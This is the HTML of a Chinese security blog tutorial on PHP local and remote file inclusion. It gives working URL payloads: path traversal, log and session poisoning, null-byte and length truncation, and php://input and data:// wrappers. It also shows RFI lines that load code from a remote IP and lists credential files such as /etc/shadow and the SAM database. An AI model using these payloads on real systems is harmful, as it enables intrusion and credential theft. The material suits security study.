@@ -1,0 +1,1034 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+  <head>
+  <meta charset="UTF-8">
+  <meta 
+    name="viewport"
+    content="width=device-width, initial-scale=1.0, minimum-scale=1.0">
+  <meta 
+    http-equiv="X-UA-Compatible" 
+    content="ie=edge">
+  <meta 
+    name="theme-color" 
+    content="#fff" 
+    id="theme-color">
+  <meta 
+    name="description" 
+    content="Chen">
+  <link 
+    rel="icon" 
+    href="/img/favicon.png">
+  <title>文件包含漏洞</title>
+  
+    
+      <meta 
+        property="og:title" 
+        content="文件包含漏洞">
+    
+    
+      <meta 
+        property="og:url" 
+        content="https://www.zerochen.top/article/%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E6%BC%8F%E6%B4%9E/index.html">
+    
+    
+      <meta 
+        property="og:img" 
+        content="/img/logo.png">
+    
+    
+    
+      <meta 
+        property="og:type" 
+        content="article">
+      <meta 
+        property="og:article:published_time" 
+        content="2021-07-24">
+      <meta 
+        property="og:article:modified_time" 
+        content="2021-08-09">
+      <meta 
+        property="og:article:author" 
+        content="沉墨">
+      
+        
+          <meta 
+            property="og:article:tag" 
+            content="文件包含">
+        
+      
+    
+  
+  <script>
+    function loadScript(url, cb) {
+      var script = document.createElement('script');
+      script.src = url;
+      if (cb) script.onload = cb;
+      script.async = true;
+      document.body.appendChild(script);
+    }
+    function loadCSS(href, data, attr) {
+      var sheet = document.createElement('link');
+      sheet.ref = 'stylesheet';
+      sheet.href = href;
+      sheet.dataset[data] = attr;
+      document.head.appendChild(sheet);
+    }
+    function changeCSS(cssFile, data, attr) {
+      var oldlink = document.querySelector(data);
+      var newlink = document.createElement("link");
+      newlink.setAttribute("rel", "stylesheet");
+      newlink.setAttribute("href", cssFile);
+      newlink.dataset.prism = attr;
+      document.head.replaceChild(newlink, oldlink);
+    }
+  </script>
+  
+    
+  
+  <script>
+    // control reverse button
+    var reverseDarkList = {
+      dark: 'light',
+      light: 'dark'
+    };
+    var themeColor = {
+      dark: '#1c1c1e',
+      light: '#fff'
+    }
+    // get the data of css prefers-color-scheme
+    var getCssMediaQuery = function() {
+      return window.matchMedia('(prefers-color-scheme: dark)').matches ? 'dark' : 'light';
+    };
+    // reverse current darkmode setting function
+    var reverseDarkModeSetting = function() {
+      var setting = localStorage.getItem('user-color-scheme');
+      if(reverseDarkList[setting]) {
+        setting = reverseDarkList[setting];
+      } else if(setting === null) {
+        setting = reverseDarkList[getCssMediaQuery()];
+      } else {
+        return;
+      }
+      localStorage.setItem('user-color-scheme', setting);
+      return setting;
+    };
+    // apply current darkmode setting
+  </script>
+  
+    <script>
+      var setDarkmode = function(mode) {
+      var setting = mode || localStorage.getItem('user-color-scheme');
+      if(setting === getCssMediaQuery()) {
+        document.documentElement.removeAttribute('data-user-color-scheme');
+        localStorage.removeItem('user-color-scheme');
+        document.getElementById('theme-color').content = themeColor[setting];
+        document.getElementById('theme-color').dataset.mode = setting;
+      } else if(reverseDarkList[setting]) {
+        document.documentElement.setAttribute('data-user-color-scheme', setting);
+        document.getElementById('theme-color').content = themeColor[setting];
+        document.getElementById('theme-color').dataset.mode = setting;
+      } else {
+        document.documentElement.removeAttribute('data-user-color-scheme');
+        localStorage.removeItem('user-color-scheme');
+        document.getElementById('theme-color').content = themeColor[getCssMediaQuery()];
+        document.getElementById('theme-color').dataset.mode = getCssMediaQuery();
+      }
+    };
+    setDarkmode();
+    </script>
+  
+  
+  <link rel="preload" href="//at.alicdn.com/t/font_1946621_i1kgafibvw.css" as="style" >
+  <link rel="preload" href="//at.alicdn.com/t/font_1952792_89b4ac4k4up.css" as="style" >
+  
+  
+    <link rel="preload" href="/js/lib/lightbox/baguetteBox.min.js" as="script">
+    <link rel="preload" href="/js/lib/lightbox/baguetteBox.min.css" as="style" >
+  
+  
+    <link rel="preload" href="/js/lib/lozad.min.js" as="script">
+  
+  
+  
+  
+  
+    
+    <link rel="prefetch" href="//unpkg.com/valine/dist/Valine.min.js" as="script">
+  
+  
+  
+  <link rel="stylesheet" href="/css/main.css">
+  
+  <link rel="stylesheet" href="//at.alicdn.com/t/font_1946621_i1kgafibvw.css">
+  
+  <link rel="stylesheet" href="//at.alicdn.com/t/font_1952792_89b4ac4k4up.css">
+  
+    <link rel="stylesheet" href="/js/lib/lightbox/baguetteBox.min.css">
+  
+  
+<meta name="generator" content="Hexo 5.4.0"></head>
+
+  <body>
+    <div class="wrapper">
+       
+      <nav class="navbar">
+  <div class="navbar-logo">
+    <span class="navbar-logo-main">
+      
+        <img 
+          class="navbar-logo-img" 
+          src="/img/favicon.png" 
+          alt="blog logo">
+      
+      <span class="navbar-logo-dsc">沉墨的小小技术圈</span>
+    </span>
+  </div>
+  <div class="navbar-menu">
+    
+      <a 
+        href="/" 
+        class="navbar-menu-item">
+        
+          首页
+        
+      </a>
+    
+      <a 
+        href="/archives" 
+        class="navbar-menu-item">
+        
+          归档
+        
+      </a>
+    
+      <a 
+        href="/tags" 
+        class="navbar-menu-item">
+        
+          标签
+        
+      </a>
+    
+      <a 
+        href="/categories" 
+        class="navbar-menu-item">
+        
+          分类
+        
+      </a>
+    
+      <a 
+        href="/about" 
+        class="navbar-menu-item">
+        
+          关于
+        
+      </a>
+    
+      <a 
+        href="/links" 
+        class="navbar-menu-item">
+        
+          友链
+        
+      </a>
+    
+    <a 
+      class="navbar-menu-item darknavbar" 
+      id="dark">
+      <i class="iconfont icon-weather"></i>
+    </a>
+    <a 
+      class="navbar-menu-item searchnavbar" 
+      id="search">
+      <i 
+        class="iconfont icon-search" 
+        style="font-size: 1.2rem; font-weight: 400;">
+      </i>
+    </a>
+  </div>
+</nav> 
+      
+      <div 
+        id="local-search" 
+        style="display: none">
+        <input
+          class="navbar-menu-item"
+          id="search-input"
+          placeholder="请输入搜索内容..." />
+        <div id="search-content"></div>
+      </div>
+      
+      <div class="section-wrap">
+        <div class="container">
+          <div class="columns">
+            <main class="main-column">
+<article class="card card-content">
+  <header>
+    <h1 class="post-title">
+      文件包含漏洞
+    </h1>
+  </header>
+  <div class="post-meta post-show-meta">
+    <time datetime="2021-07-24T09:15:30.000Z">
+      <i 
+        class="iconfont icon-calendar" 
+        style="margin-right: 2px;">
+      </i>
+      <span>2021-07-24</span>
+    </time>
+    
+      <span class="dot"></span>
+      
+        <a 
+          href="/categories/Web%E6%B8%97%E9%80%8F/" 
+          class="post-meta-link">
+          Web渗透
+        </a>
+      
+    
+    
+      <span class="dot"></span>
+      <span>1.7k 字</span>
+    
+  </div>
+  
+    <div 
+      class="post-meta post-show-meta" 
+      style="margin-top: -10px;">
+      <div style="display: flex; align-items: center;">
+        <i 
+          class="iconfont icon-biaoqian" 
+          style="margin-right: 2px; font-size: 1.15rem;">
+        </i>
+        
+          
+          <a 
+            href="/tags/%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB/" 
+            class="post-meta-link">
+            文件包含
+          </a>
+        
+      </div>
+    </div>
+  
+  </header>
+  <div 
+    id="section" 
+    class="post-content">
+    <h1 id="一、简介"><a href="#一、简介" class="headerlink" title="一、简介"></a>一、简介</h1><p>程序开发人员通常会把可重复使用的函数写到单个文件中，在使用某个函数的时候，直接调用此文件，无需再次编写，这种调用文件的过程通常称为文件包含。但是如果未对动态调用的变量做出限制（如同SQL注入漏洞一样，未对客户端输入进行过滤，从而造成违背开发人员本意的语句执行–这里是指调用了恶意文件），客户端可以调用任意文件，则造成了文件包含漏洞。</p>
+<p>大多数Web语言都可以使用文件包含操作，其中PHP语言所提供的文件包含功能太强大、太灵活。所以包含漏经常出现在PHP语言中，在JSP/ASP/ASP.net程序中比较少。</p>
+<h1 id="二、文件包含函数"><a href="#二、文件包含函数" class="headerlink" title="二、文件包含函数"></a>二、文件包含函数</h1><p><strong>常见函数</strong></p>
+<table>
+<thead>
+<tr>
+<th align="left">函数</th>
+<th align="left">说明</th>
+</tr>
+</thead>
+<tbody><tr>
+<td align="left">include()</td>
+<td align="left">找不到被包含的文件时只产生警告，脚本将继续执行</td>
+</tr>
+<tr>
+<td align="left">include_once()</td>
+<td align="left">此语句和include()语句类似，唯一区别是如果该文件中的代码已经被包含，则不会再次包含</td>
+</tr>
+<tr>
+<td align="left">require()</td>
+<td align="left">找不到被包含的文件时会产生致命错误，并停止脚本</td>
+</tr>
+<tr>
+<td align="left">require_once()</td>
+<td align="left">此语句和require()语句类似，唯一区别是如果该文件中的代码已经被包含，则不会再次包含</td>
+</tr>
+</tbody></table>
+<p>require()和include()函数的区别：</p>
+<p>使用require()函数包含文件时，只要程序执行，立即调用文件，而include()只有程序执行到该函数时才调用。</p>
+<p><strong>其它函数：</strong></p>
+<p>highlight_file()、show_source()、readfile()、file_get_contents()、fopen()、file()等</p>
+<h1 id="三、文件包含分类"><a href="#三、文件包含分类" class="headerlink" title="三、文件包含分类"></a>三、文件包含分类</h1><h2 id="1、本地文件包含–LFI"><a href="#1、本地文件包含–LFI" class="headerlink" title="1、本地文件包含–LFI"></a>1、本地文件包含–LFI</h2><p>可以读取和打开本地文件</p>
+<p><strong>前提：</strong></p>
+<p>1、allow_url_fopen=On（php.ini中进行配置，该选项默认为On）</p>
+<p>2、用户可以动态控制变量</p>
+<p><strong>利用：</strong></p>
+<p>1、获取到系统中的其他文件的内容</p>
+<p>绝对路径：?action=C:\Windows\System32\drivers\etc\hosts</p>
+<p>相对路径：?action=………………\windows\system32\drivers\etc\hosts</p>
+<p><strong>包含图片马</strong>：</p>
+<p>/action.php?action=./test.jpg</p>
+<p><strong>包含日志文件：</strong></p>
+<p>文件路径</p>
+<pre class="highlight"><span class="line">访问日志：</span><br><span class="line">	access_log（在Windows上是access.log）	</span><br><span class="line">错误日志：</span><br><span class="line">	error_log（在Windows上是error.log）</span><br><span class="line">	</span><br><span class="line">默认安装路径：</span><br><span class="line">	CentOS、Redhat、Fedora:/var/log/httpd/</span><br><span class="line">	Ubuntu、Debian、Kali:/var/log/apache2/</span><br><span class="line">源码安装路径：</span><br><span class="line">	/usr/local/apache2/logs/</span><br><span class="line">	</span><br><span class="line">具体可通过配置文件查看与更改</span><br><span class="line">	/etc/httpd/conf/httpd.conf</span><br></pre>
+
+<p>注意：</p>
+<p>1、使用日志文件包保证文件内有且只有一对脚本语言的标签，可以在零点时使用。</p>
+<p>2、使用bp抓包写入，防止出现编码问题。</p>
+<p><strong>包含session：</strong></p>
+<p>文件路径</p>
+<pre class="highlight"><span class="line">默认：</span><br><span class="line">/var/lib/php/session、/var/lib/php5/session等</span><br><span class="line">可以通过phpinfo查看，session.save_path（受版本影响）</span><br></pre>
+
+<p>session名构成：</p>
+<p>sess_[phpsessid]，phpsessid 在客户端存储信息cookie中可看到。</p>
+<p>通过代码审计或传入、包含构造的session文件进行利用</p>
+<pre class="highlight"><span class="line">利用代码（类似的源码或者自己构造）</span><br><span class="line">&lt;?php</span><br><span class="line">session_start();</span><br><span class="line">$shell=$_GET[&#x27;shell&#x27;];</span><br><span class="line">$_SESSION[&quot;username&quot;]=$shell;</span><br><span class="line">?&gt;</span><br></pre>
+
+<p><strong>利用</strong></p>
+<pre class="highlight"><span class="line">/shell.php?cmd=&lt;?php phpinfo();?&gt;		#写入一句话</span><br><span class="line">xx.php?file=/var/lib/php5/session/sess_xxxxxxx		#文件包含利用</span><br></pre>
+
+<p><strong>绕过</strong></p>
+<p>代码环境</p>
+<pre class="highlight"><span class="line">#  增加指定后缀  </span><br><span class="line">&lt;?php  $filename=$_GET[&#x27;filename&#x27;];  include($filename.&quot;php&quot;);  ?&gt;  </span><br></pre>
+
+<table>
+<thead>
+<tr>
+<th align="left">方法</th>
+<th align="left">说明</th>
+</tr>
+</thead>
+<tbody><tr>
+<td align="left">%00截断</td>
+<td align="left">前提： <br>1、magic_quotes_gpc=Off <br>2、php版本&lt;5.3.4 <br><br>用法： <br>?action=phpinfo.php%00</td>
+</tr>
+<tr>
+<td align="left">路径长度截断</td>
+<td align="left">前提： <br>1、Windows下要长于256字节，超出的部分会被丢弃 <br>2、Linux下要长于4096字节，超出的部分会被丢弃。 <br><br>用法： <br>?action=phpinfo.php../../../../…</td>
+</tr>
+<tr>
+<td align="left">点号截断</td>
+<td align="left">前提： <br>windows系统，点号需要长于256 <br>用法： <br>?action=phpinfo.php……….</td>
+</tr>
+<tr>
+<td align="left">其他</td>
+<td align="left">增加前缀： <br>相对路径、绝对路径绕过  <br><br>增加后缀 ： <br>伪协议绕过  <br>过滤../：使用…/.绕过，过滤一次还剩下../ …</td>
+</tr>
+</tbody></table>
+<h2 id="2、远程文件包含–RFI"><a href="#2、远程文件包含–RFI" class="headerlink" title="2、远程文件包含–RFI"></a>2、远程文件包含–RFI</h2><p>能够包含远程服务器上的文件并执行，可以通过http(s)或者ftp等方式，远程加载文件</p>
+<p><strong>前提：</strong></p>
+<p>1、allow_url_include=On（默认为OFF，需要在php.ini中手动打开）</p>
+<p>2、allow_url_fopen=On（是否允许打开远程文件）</p>
+<p>3、用户可以动态控制变量</p>
+<p><strong>利用——伪协议</strong></p>
+<table>
+<thead>
+<tr>
+<th align="left">协议</th>
+<th align="left">利用</th>
+</tr>
+</thead>
+<tbody><tr>
+<td align="left">file://</td>
+<td align="left">访问本地文件系统 <br>使用条件： <br>allow_url_fopen：off/on <br>allow_url_include：off/on <br><br>file: //协议在两个配置都为off的情况下是可以正常使用的  <br>使用方法： <br>file: //文件的绝对路径和文件名 [?path=file://c:\windows\System32\drivers\etc\hosts]</td>
+</tr>
+<tr>
+<td align="left">php://</td>
+<td align="left">访问各个输入/输出流 <br>php://filter <br><br>使用条件： <br>allow_url_fopen：off/on <br>allow_url_include：off/on <br>两个配置都为off的情况下是可以正常使用的  <br><br>使用： <br>[?path=php://filter/read=convert.base64-encode/resource=文件.php] <br><br>注意：<br>通过指定末尾的文件，可以读取经base64加密后的文件源码，之后再base64解码。虽然不能直接获取到shell，但能读取敏感文件。  <br><br>php://filter协议与file://协议的区别：<br>file协议只能使用绝对路径，filter协议相对路径和绝对路径都可以使用PHP伪协议  <br><br>php://input 用途： 可以访问请求的原始数据的只读流,将post请求中的数据作为PHP代码执行 <br>使用条件： allow_url_fopen：off/on allow_url_include：on <br>使用方法： ?file=php://input[POST]： (执行POST DATA中的内容)</td>
+</tr>
+<tr>
+<td align="left">zip://</td>
+<td align="left">用途： <br>读取zip压缩包内容 <br>使用条件： <br>allow_url_fopen = off/on allow_rul_include=off/on <br><br>使用方法： <br>?file=zip://D:/soft/phpstudy/www/file.zip%23phpcode.txt <br>若是zip后缀被禁用，可直接改zip后缀为jpg后缀，继续使用zip协议访问</td>
+</tr>
+<tr>
+<td align="left">phar://</td>
+<td align="left">压缩协议，使用同zip协议 <br>?file=phar://D:/soft/phpstudy/www/file.jpg%23phpcode.txt</td>
+</tr>
+<tr>
+<td align="left">data://</td>
+<td align="left">?file=data://text/plain, <br>或 <br>?file=data://text/plain;base64,base64编码数据</td>
+</tr>
+<tr>
+<td align="left">http://</td>
+<td align="left">访问HTTP(S)网址 <br>?path=<a target="_blank" rel="noopener" href="http://ip/info.php">http://ip/info.php</a></td>
+</tr>
+<tr>
+<td align="left">ftp://</td>
+<td align="left">访问FTP(S) URLS <br>?path=ftp://用户名:密码@ip/info.php</td>
+</tr>
+</tbody></table>
+<p><strong>绕过</strong></p>
+<table>
+<thead>
+<tr>
+<th align="left">方法</th>
+<th align="left">说明</th>
+</tr>
+</thead>
+<tbody><tr>
+<td align="left">问号绕过</td>
+<td align="left">?在url中是用来连接第一个变量的（多个变量使用&amp;连接） <br>?action=<a target="_blank" rel="noopener" href="http://192.168.152.143/phpinfo.php">http://192.168.152.143/phpinfo.php</a>?</td>
+</tr>
+<tr>
+<td align="left">#号绕过</td>
+<td align="left">#在url中是定位符，跳转至指定文件的#标记（相当于搜索），需要url编码 <br>?action=<a target="_blank" rel="noopener" href="http://192.168.152.143/phpinfo.php%23">http://192.168.152.143/phpinfo.php%23</a></td>
+</tr>
+<tr>
+<td align="left">空格绕过</td>
+<td align="left">windows特性 <br>?action=<a target="_blank" rel="noopener" href="http://192.168.152.143/phpinfo.php">http://192.168.152.143/phpinfo.php%20</a></td>
+</tr>
+<tr>
+<td align="left">python自定义响应包绕过</td>
+<td align="left">在服务器端使用python开启http服务，定制响应体，可绕过远程文件包含限制 <br>python -m http.server 8000 python RFIServer.py <br>下载地址：<br> <a href="https://www.zerochen.top/download/RFI/RFIServer.py">https://www.zerochen.top/download/RFI/RFIServer.py</a></td>
+</tr>
+</tbody></table>
+<h1 id="四、常见的敏感信息路径"><a href="#四、常见的敏感信息路径" class="headerlink" title="四、常见的敏感信息路径"></a>四、常见的敏感信息路径</h1><p><strong>Windows系统</strong></p>
+<pre class="highlight"><span class="line">c:\boot.ini 									# 查看系统版本</span><br><span class="line">c:\windows\system32\inetsrv\MetaBase.xml 		# IIS配置文件</span><br><span class="line">C:\windows\system32\config\sam 					# 存储Windows系统初次安装的密码</span><br><span class="line">c:\ProgramFiles\mysql\my.ini 					# MySQL配置</span><br><span class="line">c:\ProgramFiles\mysql\data\mysql\user.MYD 		# MySQL root密码</span><br><span class="line">c:\windows\php.ini 								# php 配置信息</span><br></pre>
+
+<p><strong>Linux/Unix系统</strong></p>
+<pre class="highlight"><span class="line">/etc/passwd 								# 账户信息</span><br><span class="line">/etc/shadow 								# 账户密码文件</span><br><span class="line">/usr/local/app/apache2/conf/httpd.conf 		# Apache2默认配置文件</span><br><span class="line">/usr/local/app/apache2/conf/extra/httpd-vhost.conf 			# 虚拟网站配置</span><br><span class="line">/usr/local/app/php5/lib/php.ini 			# PHP相关配置</span><br><span class="line">/etc/httpd/conf/httpd.conf 					# Apache配置文件</span><br><span class="line">/etc/my.conf 								# mysql 配置文件</span><br></pre>
+
+  </div>
+  <div>
+    
+      <div 
+        class="post-note note-warning copyright" 
+        style="margin-top: 42px">
+        <p>
+          <span style="font-weight: bold;">作者：</span><a 
+            target="_blank" 
+            rel="nofollow noopener noreferrer" 
+            href="/about">
+            沉墨
+          </a>
+        </p>
+        <p>
+          <span style="font-weight: bold;">文章链接：</span><a 
+            target="_blank" 
+            rel="nofollow noopener noreferrer" 
+            href="https://www.zerochen.top/article/%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E6%BC%8F%E6%B4%9E/">
+            https://www.zerochen.top/article/%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E6%BC%8F%E6%B4%9E/
+          </a>
+        </p>
+        <p><span style="font-weight: bold;">版权声明：</span>转载请注明出处！</p>
+      </div>
+    
+  </div>
+</article>
+<div class="nav">
+  
+    <div class="nav-item-prev">
+      <a 
+        href="/article/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E/" 
+        class="nav-link">
+        <i class="iconfont icon-left nav-prev-icon"></i>
+        <div>
+          <div class="nav-label">上一篇</div>
+          
+            <div class="nav-title">文件上传漏洞 </div>
+          
+        </div>
+      </a>
+    </div>
+  
+  
+    <div class="nav-item-next">
+      <a 
+        href="/article/SQL%E6%B3%A8%E5%85%A5%E6%80%9D%E8%B7%AF%E6%95%B4%E7%90%86/" 
+        class="nav-link">
+        <div>
+          <div class="nav-label">下一篇</div>
+          
+            <div class="nav-title">SQL注入思路整理 </div>
+          
+        </div>
+        <i class="iconfont icon-right nav-next-icon"></i>
+      </a>
+    </div>
+  
+</div>
+
+  <div 
+    class="card card-content comment-card" 
+    style="margin-top: 16px;">
+    <div class="comment-card-title">评论</div>
+    
+  <div id="vcomments"></div>
+  
+  <script>
+    loadScript("//unpkg.com/valine/dist/Valine.min.js");
+    var oldLoadVa = window.onload;
+    window.onload = function () {
+      oldLoadVa && oldLoadVa();
+      new Valine({
+        el: '#vcomments',
+        appId: '2ShT4MB47jbSbE00Kn5TgK8j-gzGzoHsz',
+        appKey: 'eC6yijqvttNWfHdJogIgmhA4',
+        placeholder: 'Just go go',
+        path: window.location.pathname,
+        avatar: 'mp',
+        meta: ["nick","mail","link"],
+        pageSize: '10',
+        lang: '',
+        visitor: 'false',
+        highlight: true,
+        recordIP: false,
+        
+        
+        
+        enableQQ: 'false',
+        requiredFields: [],
+      });
+    };
+  </script>
+
+  </div>
+
+<div 
+  class="card card-content toc-card" 
+  id="mobiletoc">
+  <div class="toc-header">
+  <i 
+    class="iconfont icon-menu" 
+    style="padding-right: 2px;">
+  </i>目录
+</div>
+<ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#%E4%B8%80%E3%80%81%E7%AE%80%E4%BB%8B"><span class="toc-text">一、简介</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E4%BA%8C%E3%80%81%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E5%87%BD%E6%95%B0"><span class="toc-text">二、文件包含函数</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E4%B8%89%E3%80%81%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E5%88%86%E7%B1%BB"><span class="toc-text">三、文件包含分类</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#1%E3%80%81%E6%9C%AC%E5%9C%B0%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E2%80%93LFI"><span class="toc-text">1、本地文件包含–LFI</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#2%E3%80%81%E8%BF%9C%E7%A8%8B%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E2%80%93RFI"><span class="toc-text">2、远程文件包含–RFI</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E5%9B%9B%E3%80%81%E5%B8%B8%E8%A7%81%E7%9A%84%E6%95%8F%E6%84%9F%E4%BF%A1%E6%81%AF%E8%B7%AF%E5%BE%84"><span class="toc-text">四、常见的敏感信息路径</span></a></li></ol>
+</div></main>
+            <aside class="left-column">
+              
+              <div class="card card-author">
+                
+  <img 
+    src="/img/logo.png" 
+    class="author-img" 
+    alt="author avatar">
+
+<p class="author-name">沉墨</p>
+<p class="author-description">谨言多思，野蛮生长</p>
+<div class="author-message">
+  <a 
+    class="author-posts-count" 
+    href="/archives">
+    <span>43</span>
+    <span>文章</span>
+  </a>
+  <a 
+    class="author-categories-count" 
+    href="/categories">
+    <span>9</span>
+    <span>分类</span>
+  </a>
+  <a 
+    class="author-tags-count" 
+    href="/tags">
+    <span>43</span>
+    <span>标签</span>
+  </a>
+</div>
+
+              </div>
+               <div class="sticky-tablet">
+  
+  
+    <article class="display-when-two-columns spacer">
+      <div class="card card-content toc-card">
+        <div class="toc-header">
+  <i 
+    class="iconfont icon-menu" 
+    style="padding-right: 2px;">
+  </i>目录
+</div>
+<ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#%E4%B8%80%E3%80%81%E7%AE%80%E4%BB%8B"><span class="toc-text">一、简介</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E4%BA%8C%E3%80%81%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E5%87%BD%E6%95%B0"><span class="toc-text">二、文件包含函数</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E4%B8%89%E3%80%81%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E5%88%86%E7%B1%BB"><span class="toc-text">三、文件包含分类</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#1%E3%80%81%E6%9C%AC%E5%9C%B0%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E2%80%93LFI"><span class="toc-text">1、本地文件包含–LFI</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#2%E3%80%81%E8%BF%9C%E7%A8%8B%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E2%80%93RFI"><span class="toc-text">2、远程文件包含–RFI</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E5%9B%9B%E3%80%81%E5%B8%B8%E8%A7%81%E7%9A%84%E6%95%8F%E6%84%9F%E4%BF%A1%E6%81%AF%E8%B7%AF%E5%BE%84"><span class="toc-text">四、常见的敏感信息路径</span></a></li></ol>
+      </div>
+    </article>
+  
+  
+  <article class="card card-content categories-widget">
+    <div class="categories-card">
+  <div class="categories-header">
+    <i 
+      class="iconfont icon-fenlei" 
+      style="padding-right: 2px;">
+    </i>分类
+  </div>
+  <div class="categories-list">
+    
+      <a href="/categories/Web%E6%B8%97%E9%80%8F/">
+        <div class="categories-list-item">
+          Web渗透
+          <span class="categories-list-item-badge">20</span>
+        </div>
+      </a>
+    
+      <a href="/categories/%E7%BC%96%E7%A8%8B%E5%9F%BA%E7%A1%80/">
+        <div class="categories-list-item">
+          编程基础
+          <span class="categories-list-item-badge">3</span>
+        </div>
+      </a>
+    
+      <a href="/categories/%E7%BD%91%E7%BB%9C%E5%9F%BA%E7%A1%80/">
+        <div class="categories-list-item">
+          网络基础
+          <span class="categories-list-item-badge">2</span>
+        </div>
+      </a>
+    
+      <a href="/categories/%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/">
+        <div class="categories-list-item">
+          漏洞复现
+          <span class="categories-list-item-badge">5</span>
+        </div>
+      </a>
+    
+      <a href="/categories/%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA/">
+        <div class="categories-list-item">
+          环境搭建
+          <span class="categories-list-item-badge">6</span>
+        </div>
+      </a>
+    
+      <a href="/categories/Linux/">
+        <div class="categories-list-item">
+          Linux
+          <span class="categories-list-item-badge">1</span>
+        </div>
+      </a>
+    
+      <a href="/categories/Python/">
+        <div class="categories-list-item">
+          Python
+          <span class="categories-list-item-badge">4</span>
+        </div>
+      </a>
+    
+      <a href="/categories/Windows/">
+        <div class="categories-list-item">
+          Windows
+          <span class="categories-list-item-badge">1</span>
+        </div>
+      </a>
+    
+      <a href="/categories/%E9%99%84%E5%8A%A0%E6%8A%80%E8%83%BD/">
+        <div class="categories-list-item">
+          附加技能
+          <span class="categories-list-item-badge">1</span>
+        </div>
+      </a>
+    
+  </div>
+</div>
+  </article>
+  
+  <article class="card card-content tags-widget">
+    <div class="tags-card">
+  <div class="tags-header">
+    <i 
+      class="iconfont icon-biaoqian" 
+      style="padding-right: 2px;">
+    </i>热门标签
+  </div>
+  <div class="tags-list">
+    
+      <a 
+        href="/tags/%E9%9A%8F%E8%AE%B0/" 
+        title="随记">
+        <div class="tags-list-item">随记</div>
+      </a>
+    
+      <a 
+        href="/tags/Redis/" 
+        title="Redis">
+        <div class="tags-list-item">Redis</div>
+      </a>
+    
+      <a 
+        href="/tags/%E9%80%BB%E8%BE%91%E6%BC%8F%E6%B4%9E/" 
+        title="逻辑漏洞">
+        <div class="tags-list-item">逻辑漏洞</div>
+      </a>
+    
+      <a 
+        href="/tags/%E7%BD%91%E7%BB%9C%E5%8D%8F%E8%AE%AE/" 
+        title="网络协议">
+        <div class="tags-list-item">网络协议</div>
+      </a>
+    
+      <a 
+        href="/tags/%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB/" 
+        title="文件包含">
+        <div class="tags-list-item">文件包含</div>
+      </a>
+    
+      <a 
+        href="/tags/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/" 
+        title="文件上传">
+        <div class="tags-list-item">文件上传</div>
+      </a>
+    
+      <a 
+        href="/tags/%E5%8D%9A%E5%AE%A2/" 
+        title="博客">
+        <div class="tags-list-item">博客</div>
+      </a>
+    
+      <a 
+        href="/tags/%E7%9B%B4%E6%92%AD%E6%8E%A8%E6%B5%81/" 
+        title="直播推流">
+        <div class="tags-list-item">直播推流</div>
+      </a>
+    
+      <a 
+        href="/tags/Nginx/" 
+        title="Nginx">
+        <div class="tags-list-item">Nginx</div>
+      </a>
+    
+      <a 
+        href="/tags/Apache/" 
+        title="Apache">
+        <div class="tags-list-item">Apache</div>
+      </a>
+    
+      <a 
+        href="/tags/%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/" 
+        title="命令执行">
+        <div class="tags-list-item">命令执行</div>
+      </a>
+    
+      <a 
+        href="/tags/%E5%8F%8D%E5%BC%B9shell/" 
+        title="反弹shell">
+        <div class="tags-list-item">反弹shell</div>
+      </a>
+    
+      <a 
+        href="/tags/%E6%8F%90%E6%9D%83/" 
+        title="提权">
+        <div class="tags-list-item">提权</div>
+      </a>
+    
+      <a 
+        href="/tags/%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/" 
+        title="信息收集">
+        <div class="tags-list-item">信息收集</div>
+      </a>
+    
+      <a 
+        href="/tags/DVWA/" 
+        title="DVWA">
+        <div class="tags-list-item">DVWA</div>
+      </a>
+    
+      <a 
+        href="/tags/SSRF/" 
+        title="SSRF">
+        <div class="tags-list-item">SSRF</div>
+      </a>
+    
+  </div>
+</div>
+  </article>
+  
+  
+</div>
+            </aside>
+            <aside class="right-column">
+              <div class="sticky-widescreen">
+  
+  
+    <article class="card card-content toc-card">
+      <div class="toc-header">
+  <i 
+    class="iconfont icon-menu" 
+    style="padding-right: 2px;">
+  </i>目录
+</div>
